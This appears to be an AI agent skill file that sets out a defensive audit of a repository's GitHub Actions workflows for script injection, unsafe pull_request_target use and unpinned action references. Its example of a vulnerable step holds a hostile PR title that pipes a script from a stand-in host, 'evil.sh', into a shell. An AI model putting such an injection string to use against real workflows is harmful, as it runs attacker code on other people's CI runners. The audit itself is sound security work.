---
name: actions-injection-review
description: Audit this repo's GitHub Actions workflows (.github/workflows/*.yml) for script-injection (CWE-94, untrusted `${{ }}` expression context interpolated into a run: shell step), dangerous pull_request_target + untrusted-checkout combinations, and unpinned third-party Action refs. Distinct from owasp-review (application code) and CodeQL's "actions" language pack (missing-permissions only) — this is the class of vulnerability neither of those two targets. Use when asked to review workflow security, check for Actions/CI injection, or "can a PR title/body run code in CI."
context: fork
agent: Explore
---

# GitHub Actions script-injection audit

This is a narrow, specific audit — not a general CI/CD review. It targets one
well-documented, real-world vulnerability class that is invisible to both of
this repo's other security tools:

- **`owasp-review`** audits application code (`src/`, `cli/`) — it has no
  reason to open `.github/workflows/`.
- **CodeQL's `actions` language pack** (already running here, and already
  caught + fixed `actions/missing-workflow-permissions` twice — see
  `AGENTS.md`) checks for missing `permissions:` blocks, not for injection via
  untrusted expression interpolation. A workflow can have perfectly scoped
  `permissions: contents: read` and still be exploitable this way.

Verify every claim below against the actual current workflow files before
reporting — this was last confirmed against `.github/workflows/*.yml` at
authoring time (`ci.yml`, `codecov.yml`, `deploy-demo.yml`, `e2e.yml`,
`release.yml`) and may have drifted since.

## The vulnerability, concretely

GitHub Actions expands `${{ ... }}` expressions as raw text substitution
**before** a `run:` step's shell ever sees the script — not as a shell-quoted
argument. If the expression pulls from a context an outside contributor
controls (an issue/PR title, a branch name, a commit message, a comment
body), that text becomes part of the shell command verbatim:

```yaml
# VULNERABLE — a PR titled `"; curl evil.sh | sh #` runs arbitrary code
- run: echo "Building ${{ github.event.pull_request.title }}"
```

The fix GitHub's own hardening guidance recommends is never interpolating an
untrusted context directly into `run:` — pass it through `env:` first (where
it becomes a real, shell-escaped environment variable) and reference the
variable, not the expression, inside the script:

```yaml
# SAFE — the value reaches the shell as $PR_TITLE's content, not as script
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building $PR_TITLE"
```

## Methodology

1. **Enumerate every `run:` step across every workflow file** (`grep -n
   "run:" .github/workflows/*.yml`, then read each step's full script body —
   a multi-line `run: |` block can bury the interpolation several lines in).

2. **For each `run:` step, grep its own body for `${{`.** Any hit needs a
   judgment call on the expression's source:
   - **Untrusted / attacker-influenced** (the actual finding category):
     `github.event.issue.title`, `github.event.issue.body`,
     `github.event.pull_request.title`, `github.event.pull_request.body`,
     `github.event.comment.body`, `github.event.review.body`,
     `github.event.pull_request.head.ref` (a branch name — attacker-chosen on
     a fork), `github.head_ref`, and generally anything under
     `github.event.*` sourced from a form field a non-collaborator can fill
     in. A `run:` step interpolating one of these directly is a real,
     reportable finding — quote the exact file:line and show the injection
     string that would trigger it (mirror the vulnerable example above).
   - **Trusted / not attacker-controlled**: `github.sha`, `github.ref`
     (on `push`, not attacker-settable), `secrets.*` (the secret's *value*
     isn't attacker-chosen, though logging it is a separate concern —
     redaction is automatic for known secret values but not for
     transformations of them), `steps.<id>.outputs.*` where that step's own
     output is itself static or already-sanitized, `inputs.*` on a
     `workflow_dispatch` restricted to collaborators. Not a finding, but say
     why in the report rather than silently passing over it.
   - **This repo's actual `${{ }}` usages found at authoring time** —
     `${{ !cancelled() }}` (an `if:` condition, not a `run:` body — different
     mechanism, not in scope for this check), `${{ secrets.CODECOV_TOKEN }}`
     (passed as a scoped `with: token:` input to an action, never reaches a
     shell), `${{ steps.deployment.outputs.page_url }}` (an `environment:
     url:` field, not a shell). None of these are `run:` interpolations —
     confirm this is still true rather than assuming it from this list.

3. **Check every workflow's trigger for `pull_request_target` or
   `workflow_run`.** Neither is inherently unsafe, but each runs with the
   *base* repo's permissions/secrets while potentially checking out or
   building *fork* (PR head) content — the dangerous combination is
   `pull_request_target` **plus** a step that checks out
   `github.event.pull_request.head.sha`/`head.ref` **plus** a build/install
   step that executes fork-controlled code (an `npm ci`/`npm run build` that
   would run a malicious `package.json` postinstall script, e.g.). If found,
   report the exact combination of steps that creates the exposure, not just
   the trigger's presence — `pull_request_target` alone, used only to
   comment on a PR without ever touching fork code, is fine. As of authoring,
   no workflow in this repo uses `pull_request_target` or `workflow_run` —
   confirm this is still true.

4. **Secondary check, same file set — third-party Action pinning.** Every
   `uses:` line pinned to a mutable tag (`actions/checkout@v5`,
   `softprops/action-gh-release@v3`) rather than a full commit SHA is a
   supply-chain trust dependency on that tag never being force-moved to
   point at different, compromised code — either by the upstream maintainer
   being compromised, or (for less-established actions) the repo owner
   themselves acting maliciously later. This is a lower-severity, separate
   finding category from script injection — report it distinctly, don't
   conflate the two. Note plainly that `actions/*` (GitHub-owned) carries
   materially lower risk than a smaller third-party action, so weight the
   report accordingly rather than flagging every unpinned `uses:` line as
   equally urgent.

## Reporting discipline

Match `owasp-review`'s standard, not a generic checklist pass:
- Quote the actual file:line for every finding, plus a concrete exploit
  string (a PR title, branch name, or comment body) that would trigger it —
  not a theoretical description.
- Distinguish a confirmed, exploitable `run:`-body interpolation from a
  merely-unpinned-but-official Action (real severity difference, don't
  flatten both into "a finding").
- End with a per-workflow-file status table (Assessed/Clean,
  Assessed/Finding(s)) so nothing silently falls through, plus a one-line
  total for the Action-pinning secondary check.
